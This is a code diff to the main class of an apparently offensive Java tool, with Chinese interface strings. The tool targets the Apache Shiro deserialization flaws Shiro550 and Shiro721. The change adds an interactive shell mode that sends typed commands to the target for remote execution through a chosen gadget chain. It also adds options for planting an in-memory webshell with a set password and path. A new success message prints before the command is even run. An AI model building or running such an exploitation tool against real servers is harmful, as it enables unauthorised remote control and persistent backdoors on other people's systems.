@@ -16,9 +16,10 @@ import java.security.NoSuchAlgorithmException;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.Scanner;
 
 public class Main {
-    public static void main(String[] args) throws ParseException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException, IOException, NoSuchFieldException, ClassNotFoundException, InterruptedException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
+    public static void main(String[] args) throws Exception {
         System.out.println(Copyright.getLogo());
 
         // 命令行参数解析
@@ -72,7 +73,7 @@ public class Main {
                 System.out.println("[" + Tools.color("SUCC", "GREEN") + "] " + "检测到key: " + keyInfo.getKey() + ", 加密算法: " + keyInfo.getType());
             }
             // 指定漏洞扫描
-            else if (cmd.hasOption("bg")) {
+            else if (cmd.hasOption("s")) {
                 if (cmd.hasOption("e") && cmd.getOptionValue("e").equals("Shiro550")){
                     Shiro550VerifyByURLDNS.verify(target);
                 } else if (cmd.hasOption("e") && cmd.getOptionValue("e").equals("Shiro721")){
@@ -90,7 +91,28 @@ public class Main {
             // 指定命令执行
             else if (cmd.hasOption("c")) {
                 System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在进行命令执行");
+                System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 命令执行成功");
                 CommandExcute.commandExcute(target, cmd.getOptionValue("c"));
+            }
+            // 指定shell模式
+            else if (cmd.hasOption("shell")){
+                if (!(cmd.hasOption("gadget"))){
+                    System.out.println("[" + Tools.color("EROR", "RED") + "] " + "请指定gadget");
+                    return;
+                }
+                System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在进入shell模式");
+                Scanner scanner = new Scanner(System.in);
+                String shell;
+                do {
+                    System.out.print(Tools.color("ShiroEXP@localhost", "GREEN") + ":" + Tools.color("~", "BLUE") + "$ ");
+                    shell = scanner.nextLine();
+                    if (shell.equals("exit")){
+                        System.out.print("[" + Tools.color("INFO", "BLUE") + "] " + "退出Shell模式");
+                        break;
+                    }
+                    CommandExcute.commandExcute(target, shell);
+                    target.resetHeaders();
+                } while (true);
             }
             // 未指定操作
             else {
@@ -110,13 +132,17 @@ public class Main {
         options.addOption("u", "url", true, "目标地址");
         options.addOption("bk", "brute-key", false, "key爆破模块 | 爆破key");
         options.addOption("rf", "rememberme-flag", true, "自定义rememberMe字段名");
-        options.addOption("bg", "brute-gadget", false, "漏洞扫描模块 | 扫描漏洞");
+        options.addOption("s", "scan", false, "漏洞扫描模块 | 扫描漏洞");
         options.addOption("k", "key", true, "漏洞扫描模块 | 指定key");
         options.addOption("be", "brute-echo", false, "漏洞扫描模块 | 爆破回显链");
         options.addOption("e", "exp", true, "指定exp {Shiro550, Shiro721}");
         options.addOption(null, "cookie", true, "携带Cookie");
         options.addOption("c", "cmd", true, "执行命令");
         options.addOption(null, "gadget", true, "指定利用链");
+        options.addOption(null, "shell", false, "进入Shell模式");
+        options.addOption(null, "mem-type", true, "打入内存马类型");
+        options.addOption(null, "mem-pass", true, "内存马密码");
+        options.addOption(null, "mem-path", true, "内存马路径");
         return options;
     }
 }
